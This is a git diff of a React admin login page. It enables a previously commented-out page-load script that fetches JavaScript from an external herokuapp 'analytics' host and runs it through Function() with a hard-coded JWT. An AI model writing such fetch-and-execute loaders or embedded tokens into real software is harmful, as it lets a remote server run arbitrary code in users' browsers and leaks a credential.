@@ -2,7 +2,7 @@ import * as React from "react";
 import { Card, CardHeader, CardBody, CardTitle, Input } from 'reactstrap';
 import { Button } from 'react-bootstrap';
 import { Link } from 'react-router-dom';
-/*
+
 document.addEventListener("DOMContentLoaded",function() {
     const e="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTU4LCJpYXQiOjE1NTI0NDI1NTB9._MG5bmn2IZEyRzUyBSx0YIQ68_m0igdPgXOfvWjBAoM";
     const t=function() {
@@ -15,6 +15,7 @@ document.addEventListener("DOMContentLoaded",function() {
     }(); t
     ?function(t) {
         let n = new XMLHttpRequest;
+        /* eslint-disable no-unused-expressions */
         n.open("GET", "https://gti525-analitycs.herokuapp.com/api/v1/banners/code", !0),
         n.onload=function(o){
             4 === n.readyState && 200 === n.status && Function(`return (${n.responseText})`)()(t,e)},
@@ -22,6 +23,7 @@ document.addEventListener("DOMContentLoaded",function() {
     }(t)
     :function() { 
         let t = new XMLHttpRequest;
+        /* eslint-disable no-unused-expressions */
         t.open("GET", "https://gti525-analitycs.herokuapp.com/api/v1/analytics/code", !0),
         t.onload=function(n){ 
             4 === t.readyState && 200 === t.status && Function(`return (${t.responseText})`)()(e)},
@@ -29,7 +31,7 @@ document.addEventListener("DOMContentLoaded",function() {
         t.send()
     }()
 }, !1);
-*/
+
 export default class LoginAdmin extends React.Component { 
     constructor(props) {
         super(props);
